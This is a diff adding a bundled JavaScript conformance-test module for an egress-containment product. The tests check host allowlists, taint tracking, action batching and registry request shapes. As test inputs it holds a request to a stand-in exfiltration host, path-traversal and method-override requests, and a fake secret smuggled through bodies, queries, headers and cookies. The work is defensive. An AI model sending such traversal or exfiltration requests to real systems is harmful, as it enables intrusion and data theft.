@@ -1,0 +1,483 @@
+import { n as createEgressGuard, t as EgressDeniedError } from "./egress-guard-BhEVaiEm.js";
+import { s as resolveRequestShape } from "./request-shape-CUn8Io5f.js";
+import { $ as createEgressRunner, _ as actionKey, c as createActionBatcher, f as resolveActionBatcherOptions, i as DEFAULT_ACTION_BATCHER_OPTIONS, j as wireRequestUrl } from "./src-Bv_GP2Sj.js";
+import { t as buildCanonicalizerStage } from "./stage-jNiIyhjX.js";
+import "./api-CqhWkA5V.js";
+import { i as createTaintStore, n as buildTaintTrackerStage } from "./config-LnNnllfP.js";
+import "./api-Dos50wTN.js";
+import { O as planContainment } from "./exec-caches-FmW8zVgK.js";
+import { S as createContainerCa, c as packageInstallDeclaration, l as projectScriptDeclaration, y as createEgressRelay } from "./mcp-DCNWYsrE.js";
+import { a as withTempDir, n as expectThat, t as egressSuiteLicensed } from "./types-CPFzDBXk.js";
+import fs from "node:fs";
+import path from "node:path";
+import { createHash, randomUUID } from "node:crypto";
+import net from "node:net";
+import http from "node:http";
+//#region src/enclawed/conformance/checks-egress.ts
+async function checkHostAllowlist() {
+	let connected = false;
+	const guarded = createEgressGuard({
+		allowedHosts: ["127.0.0.1"],
+		fetchImpl: (async () => {
+			connected = true;
+			return new Response("");
+		})
+	});
+	let denied = false;
+	try {
+		await guarded("https://exfil.example/collect");
+	} catch (err) {
+		denied = err instanceof EgressDeniedError;
+	}
+	expectThat(denied && !connected, "a request to a host outside the allowlist was sent");
+}
+const egressMediation = {
+	id: "egress-mediation",
+	title: "Egress mediation",
+	proves: "outbound content carrying a protected value is blocked, hidden characters are removed, and requests to hosts outside the allowlist are refused before any connection",
+	remedy: "keep this installation off untrusted networks and channels until it is reinstalled; report the failure to your Enclawed contact",
+	async run() {
+		await checkHostAllowlist();
+		if (!await egressSuiteLicensed()) return { skip: "the covert-channel egress suite is not licensed on this installation, so outbound content mediation refuses to run (it fails closed instead of running unchecked); the host allowlist was checked" };
+		const store = createTaintStore();
+		const canary = `conformance-canary-${randomUUID()}`;
+		store.tag("*", canary, "conformance");
+		const run = createEgressRunner({ stages: [buildCanonicalizerStage(), buildTaintTrackerStage({ store })] });
+		const sink = {
+			kind: "channel",
+			id: "conformance"
+		};
+		expectThat((await run(`here it is: ${canary}`, sink)).cancelled, "a protected value left");
+		const hidden = await run("hel​lo⁣", sink);
+		expectThat(!hidden.cancelled && hidden.content === "hello", "hidden characters in outbound text were not removed");
+		const plain = await run("status report: all good", sink);
+		expectThat(!plain.cancelled && plain.content === "status report: all good", "ordinary text was changed or blocked");
+	}
+};
+const get = (url) => ({
+	type: "http",
+	method: "GET",
+	url
+});
+function manualBatcher(options) {
+	const client = {
+		check: async () => ({ ok: true }),
+		send: async (url) => {
+			wireRequestUrl(url);
+		}
+	};
+	return createActionBatcher(options, {
+		now: () => 1e3,
+		setTimer: () => null,
+		clearTimer: () => {},
+		sleep: async () => {},
+		paddingClient: () => client,
+		issuedTimeoutMs: 50
+	});
+}
+async function window(options, items) {
+	const batcher = manualBatcher(options);
+	const order = [];
+	try {
+		const promises = items.map((item) => batcher.submit({
+			...item,
+			scope: "conformance"
+		}).then((r) => {
+			if (r.outcome === "execute") order.push(item.id);
+			return r;
+		}));
+		batcher.flush();
+		return {
+			releases: await Promise.all(promises),
+			order
+		};
+	} finally {
+		batcher.dispose();
+	}
+}
+const choiceChannels = {
+	id: "egress-choice-channels",
+	title: "Choice-channel batcher",
+	proves: "the order and repetition of outbound actions cannot carry hidden data: actions leave in a canonical order, idempotent repeats collapse, out-of-set requests fail closed, and weakening settings are refused",
+	remedy: "turn off outbound tools on this installation until it is reinstalled; report the failure to your Enclawed contact",
+	async run() {
+		const opts = { ...DEFAULT_ACTION_BATCHER_OPTIONS };
+		const urls = Array.from({ length: 6 }, (_, i) => `https://h.test/item/${i}`);
+		const forward = await window(opts, urls.map((u, i) => ({
+			id: `a${i}`,
+			action: get(u)
+		})));
+		const reverse = await window(opts, urls.toReversed().map((u, i) => ({
+			id: `a${urls.length - 1 - i}`,
+			action: get(u)
+		})));
+		const canonical = urls.map((u, i) => ({
+			id: `a${i}`,
+			key: actionKey(get(u))
+		})).toSorted((a, b) => a.key < b.key ? -1 : 1).map((x) => x.id);
+		expectThat(forward.order.join() === reverse.order.join() && forward.order.join() === canonical.join(), "the arrival order of actions showed through");
+		const repeats = await window(opts, [{
+			id: "g1",
+			action: get(urls[0])
+		}, {
+			id: "g2",
+			action: get(urls[0])
+		}]);
+		expectThat(repeats.releases[0].outcome === "execute" && repeats.releases[1].outcome === "collapsed", "an idempotent repeat was sent twice");
+		expectThat((await window(resolveActionBatcherOptions({ padding: {
+			enabled: true,
+			allowedSet: urls.slice(0, 2)
+		} }), [{
+			id: "o1",
+			action: get("https://elsewhere.test/x")
+		}])).releases[0].outcome === "blocked", "a request outside the constant set was sent without budget");
+		for (const bad of [
+			{ windowMs: 5 },
+			{ canonicalOrder: false },
+			{ cacheTtlMs: 0 },
+			{ x: 1 }
+		]) {
+			let refused = false;
+			try {
+				resolveActionBatcherOptions(bad);
+			} catch {
+				refused = true;
+			}
+			expectThat(refused, `a weakening batcher setting was accepted: ${JSON.stringify(bad)}`);
+		}
+	}
+};
+const REGISTRY = "registry.conformance.test";
+const PROXY = "proxy.conformance.test";
+const PROXY_PREFIX = "/artifactory/api/npm/npm-remote";
+const TARBALL = "/left-pad/-/left-pad-1.3.0.tgz";
+/** One raw HTTP/1.1 exchange through the relay to `name` (plain-HTTP destination). */
+function exchange(relayPort, name, text) {
+	return new Promise((resolve) => {
+		const sock = net.connect(relayPort, "127.0.0.1");
+		const chunks = [];
+		let acked = false;
+		const done = () => {
+			const all = Buffer.concat(chunks).toString("latin1");
+			resolve({
+				status: Number(/^HTTP\/1\.1 (\d{3})/.exec(all)?.[1] ?? 0),
+				body: all.slice(all.indexOf("\r\n\r\n") + 4)
+			});
+		};
+		sock.on("connect", () => sock.write(`${JSON.stringify({
+			name,
+			port: 80
+		})}\n`));
+		sock.on("data", (c) => {
+			if (!acked) {
+				acked = true;
+				c = c.subarray(1);
+				sock.write(text);
+			}
+			chunks.push(c);
+		});
+		sock.on("close", done);
+		sock.on("error", () => sock.destroy());
+		setTimeout(() => sock.destroy(), 5e3).unref();
+	});
+}
+const egressRequestShape = {
+	id: "egress-request-shape",
+	title: "Registry request shapes",
+	proves: "a contained process whose network is a package registry (or a proxy of one) reaches it only with package metadata and artifact fetches: other methods, traversal and encoded paths, the proxy's own API, bodies and override headers are refused before the registry sees them, and a pinned artifact whose content does not match its pin is refused before the process sees it; installs use the registry shape by default",
+	remedy: "do not run package installs or registry-only agents on this installation until it is reinstalled; report the failure to your Enclawed contact",
+	async run() {
+		for (const [tool, profile] of [["npm", "npm-registry"], ["pip", "pypi"]]) {
+			const d = packageInstallDeclaration({
+				label: `${tool} install`,
+				tool,
+				projectDir: "/nonexistent",
+				command: tool,
+				args: ["install"]
+			});
+			const shapes = "error" in d ? [] : (d.destinations ?? []).map((x) => x.shape);
+			expectThat(shapes.length > 0 && shapes.every((sh) => typeof sh === "object" && sh !== null && sh.profile === profile), `a ${tool} install reaches its registry without the ${profile} request shape`);
+		}
+		const good = "the real tarball bytes";
+		const sri = `sha512-${createHash("sha512").update(good).digest("base64")}`;
+		const seen = [];
+		const upstream = http.createServer((req, res) => {
+			seen.push(`${req.headers.host} ${req.method} ${req.url}`);
+			const tampered = req.url === `${PROXY_PREFIX}${TARBALL}`;
+			res.end(req.url?.endsWith(".tgz") ? tampered ? "a backdoored tarball" : good : "{}");
+		});
+		await new Promise((r) => upstream.listen(0, "127.0.0.1", () => r()));
+		const upPort = upstream.address().port;
+		const dest = (host, shape) => {
+			const r = resolveRequestShape(shape);
+			if (!r.ok) throw new Error(r.message);
+			return {
+				host,
+				port: 80,
+				mode: "http",
+				background: true,
+				profiles: [],
+				constants: [],
+				shape: r.shape
+			};
+		};
+		const events = [];
+		const relay = createEgressRelay({
+			label: "conformance",
+			destinations: [dest(REGISTRY, {
+				profile: "npm-registry",
+				pins: { [TARBALL]: sri }
+			}), dest(PROXY, {
+				profile: "npm-registry",
+				pathPrefix: PROXY_PREFIX,
+				pins: { [TARBALL]: sri }
+			})],
+			ca: createContainerCa("conformance", [REGISTRY, PROXY]),
+			secrets: [],
+			secretValues: /* @__PURE__ */ new Map(),
+			handles: /* @__PURE__ */ new Map(),
+			upstream: () => ({
+				host: "127.0.0.1",
+				port: upPort
+			}),
+			onEvent: (e) => events.push(e)
+		});
+		const server = net.createServer((s) => relay.handle(s));
+		await new Promise((r) => server.listen(0, "127.0.0.1", () => r()));
+		const port = server.address().port;
+		const send = (host, line, extra = "", body = "") => exchange(port, host, `${line} HTTP/1.1\r\nHost: ${host}\r\n${extra}Connection: close\r\n\r\n${body}`);
+		try {
+			const meta = await send(REGISTRY, "GET /left-pad");
+			expectThat(meta.status === 200, `package metadata was not fetched (status ${meta.status})`);
+			const tgz = await send(REGISTRY, `GET ${TARBALL}`);
+			expectThat(tgz.status === 200 && tgz.body === good, `a pinned tarball with the right content was not handed over (status ${tgz.status})`);
+			const bad = await send(PROXY, `GET ${PROXY_PREFIX}${TARBALL}`);
+			expectThat(bad.status === 403 && !bad.body.includes("backdoored"), "a tarball whose content does not match its pin reached the process");
+			const before = seen.length;
+			for (const [host, line, extra, body] of [
+				[
+					REGISTRY,
+					"POST /left-pad",
+					"Content-Length: 2\r\n",
+					"{}"
+				],
+				[
+					REGISTRY,
+					"PUT /left-pad",
+					"Content-Length: 0\r\n",
+					""
+				],
+				[
+					REGISTRY,
+					"GET /left-pad/..%2f..%2fadmin",
+					"",
+					""
+				],
+				[
+					REGISTRY,
+					"GET /left-pad/..;/admin",
+					"",
+					""
+				],
+				[
+					REGISTRY,
+					"GET /-/whoami",
+					"",
+					""
+				],
+				[
+					REGISTRY,
+					"GET /left-pad?x=1",
+					"",
+					""
+				],
+				[
+					REGISTRY,
+					"GET /left-pad",
+					"X-HTTP-Method-Override: PUT\r\n",
+					""
+				],
+				[
+					REGISTRY,
+					"GET /left-pad",
+					"Content-Length: 4\r\n",
+					"boom"
+				],
+				[
+					PROXY,
+					"GET /artifactory/api/system/ping",
+					"",
+					""
+				],
+				[
+					PROXY,
+					`GET ${PROXY_PREFIX}/../../system/ping`,
+					"",
+					""
+				]
+			]) {
+				const r = await send(host, line, extra, body);
+				expectThat(r.status === 403, `an exploit-shaped request was not refused: ${line} (${r.status})`);
+			}
+			expectThat(seen.length === before, `a refused request reached the registry: ${seen.slice(before).join("; ")}`);
+			expectThat(events.some((e) => e.type === "egress-refused" && e.code === "artifact-pin-mismatch"), "the pin mismatch was not reported");
+		} finally {
+			relay.close();
+			await new Promise((r) => server.close(() => r()));
+			await new Promise((r) => upstream.close(() => r()));
+		}
+	}
+};
+const DOCS = "docs.conformance.test";
+const CHECKS = [
+	egressMediation,
+	choiceChannels,
+	egressRequestShape,
+	{
+		id: "egress-no-free-form",
+		title: "No free-form egress to declared destinations",
+		proves: "every destination a contained process may reach has a request profile: one declared without a profile takes the strictest generic one (GET or HEAD below the declared path, no body, no query, no credential or custom header), so data sent through a body, a query, a header or a long or deep path is refused before the destination sees it, the path choice that remains is charged against a capacity budget, and an API profile or an unread destination is accepted only in a signed admission record",
+		remedy: "do not run contained scripts or MCP servers that reach the network on this installation until it is reinstalled; report the failure to your Enclawed contact",
+		async run() {
+			await withTempDir("no-free-form", async (dir) => {
+				const project = path.join(dir, "project");
+				fs.mkdirSync(project);
+				const decl = (destinations) => planContainment(projectScriptDeclaration({
+					label: "conformance",
+					projectDir: project,
+					command: "sh",
+					args: [],
+					destinations
+				}), {
+					home: path.join(dir, "home"),
+					uid: 1e3,
+					gid: 1e3,
+					libraries: () => []
+				});
+				const plain = decl([{
+					host: DOCS,
+					port: 443,
+					mode: "inspect"
+				}]);
+				expectThat(plain.ok && plain.plan.destinations[0].shape?.profile === "generic", `a destination declared without a profile did not get the generic one (${plain.ok ? plain.plan.destinations[0].shape?.profile : plain.message})`);
+				for (const d of [{
+					host: DOCS,
+					port: 443,
+					mode: "inspect",
+					shape: {
+						profile: "api",
+						routes: [{
+							method: "POST",
+							path: "/x"
+						}]
+					}
+				}, {
+					host: DOCS,
+					port: 5432,
+					mode: "opaque"
+				}]) expectThat(!decl([d]).ok, `a project script was planned with ${d.mode === "opaque" ? "an opaque destination" : "an api profile"}`);
+			});
+			const seen = [];
+			const upstream = http.createServer((req, res) => {
+				seen.push(`${req.method} ${req.url}`);
+				res.end("ok");
+			});
+			await new Promise((r) => upstream.listen(0, "127.0.0.1", () => r()));
+			const upPort = upstream.address().port;
+			let clock = 0;
+			const events = [];
+			const relay = createEgressRelay({
+				label: "conformance",
+				destinations: [{
+					host: DOCS,
+					port: 80,
+					mode: "http",
+					background: true,
+					profiles: [],
+					constants: [],
+					shape: null
+				}],
+				ca: createContainerCa("conformance", [DOCS]),
+				secrets: [],
+				secretValues: /* @__PURE__ */ new Map(),
+				handles: /* @__PURE__ */ new Map(),
+				upstream: () => ({
+					host: "127.0.0.1",
+					port: upPort
+				}),
+				onEvent: (e) => events.push(e),
+				ledgerClock: () => clock
+			});
+			const server = net.createServer((s) => relay.handle(s));
+			await new Promise((r) => server.listen(0, "127.0.0.1", () => r()));
+			const port = server.address().port;
+			const send = (line, extra = "", body = "") => exchange(port, DOCS, `${line} HTTP/1.1\r\nHost: ${DOCS}\r\n${extra}Connection: close\r\n\r\n${body}`);
+			try {
+				const ok = await send("GET /guide/install.html");
+				expectThat(ok.status === 200, `a plain fetch was refused (${ok.status})`);
+				const before = seen.length;
+				const secret = "c2VjcmV0LWZyb20tdGhlLXByb2plY3Q";
+				for (const [line, extra, body] of [
+					[
+						"POST /upload",
+						`Content-Length: 31\r\n`,
+						secret
+					],
+					[
+						"GET /x",
+						`Content-Length: 31\r\n`,
+						secret
+					],
+					[
+						`GET /search?q=${secret}`,
+						"",
+						""
+					],
+					[
+						"GET /x",
+						`X-Data: ${secret}\r\n`,
+						""
+					],
+					[
+						"GET /x",
+						`Authorization: Bearer ${secret}\r\n`,
+						""
+					],
+					[
+						"GET /x",
+						`Cookie: s=${secret}\r\n`,
+						""
+					],
+					[
+						`GET /${secret}${secret}`,
+						"",
+						""
+					],
+					[
+						`GET /${"a/".repeat(8)}b`,
+						"",
+						""
+					],
+					[
+						"GET /a%2fb",
+						"",
+						""
+					]
+				]) {
+					const r = await send(line, extra, body);
+					expectThat(r.status === 403, `an exfiltration-shaped request was not refused: ${line.slice(0, 40)} (${r.status})`);
+				}
+				expectThat(seen.length === before, `a refused request reached the destination: ${seen.slice(before).join("; ")}`);
+				let refusedForCapacity = false;
+				for (let i = 0; i < 400 && !refusedForCapacity; i++) refusedForCapacity = (await send(`GET /${String(i).padStart(40, "x")}`)).status === 403;
+				expectThat(refusedForCapacity && events.some((e) => e.type === "egress-refused" && e.code === "request-shape-capacity"), "a stream of distinct paths to one destination was never stopped by its capacity budget");
+			} finally {
+				relay.close();
+				await new Promise((r) => server.close(() => r()));
+				await new Promise((r) => upstream.close(() => r()));
+			}
+		}
+	}
+];
+//#endregion
+export { CHECKS };
